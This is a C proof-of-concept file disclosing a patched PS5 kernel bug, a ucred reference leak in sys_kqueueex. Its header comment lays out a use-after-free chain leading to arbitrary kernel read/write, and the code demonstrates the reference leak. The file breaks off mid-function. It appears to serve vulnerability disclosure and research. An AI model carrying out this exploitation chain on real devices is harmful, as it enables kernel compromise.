/*

Copyright (C) 2026 Gezine

This software may be modified and distributed under the terms
of the MIT license.

P2JB (Patience to Jailbreak)

Bug was patched at PS5 13.00
Exploitable code is only present at PS5 as PS4 kqueue does not hold ucred

In sys_kqueueex syscall, crhold() is called on ucred to store a credential reference in the kqueue struct. If the optional name argument is non-NULL and copyinstr() fails, the error cleanup path calls free(), fdclose(), and fdrop() — but never crfree() — leaving the ucred reference count permanently incremented.

Exploitation:

// Any non-NULL pointer causing copyinstr to fail
__sys_kqueueex((const char *)0x800000000000ULL);  // EFAULT, leaks 1 ref

Repeatedly call sys_kqueueex with an invalid name pointer, leaking one cr_ref per call. The 32-bit counter approaches 0xFFFFFFFF in few hours, reducible with multiple threads.
Before cr_ref reaches 0, open several files. Each falloc calls crhold(td->td_ucred) for fp->f_cred, bumping cr_ref by 1 per file. This gives the attacker controlled references to the ucred object.
When cr_ref reaches 1, call setuid(). This causes the kernel to allocate a new ucred buffer, copy the existing credentials into it, and call crfree() on the old ucred — decrementing cr_ref to 0 and freeing the old ucred object, while the previously opened files still hold fp->f_cred pointers into the now-freed memory.
Spray the heap with attacker-controlled data with cr_ref = 1. This reclaims the freed ucred memory.
Close one of the previously opened file. fdrop calls crfree(fp->f_cred) on the fake ucred, decrementing the attacker-controlled cr_ref.
Doing this repeatedly will result double, triple frees to f_cred which will lead to arbitrary kernel read write.

Below is PoC

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <ps5/kernel.h>

int __sys_kqueueex(const char *name);

int
main(int argc, char *argv[]) {
    unsigned long ucred = kernel_get_proc_ucred(getpid());
    if (!ucred) {
        printf("failed to get ucred\n");
        return 1;
    }

    unsigned int ref_before = 0;
    kernel_copyout(ucred, &ref_before, sizeof(ref_before));
    printf("cr_ref before: %u\n", ref_before);

    for (int i = 0; i < 1000; i++) {
        errno = 0;
        int ret = __sys_kqueueex((const char *)0x800000000000ULL);
        printf("call %d: ret = %d errno = %d\n", i, ret, errno);
    }
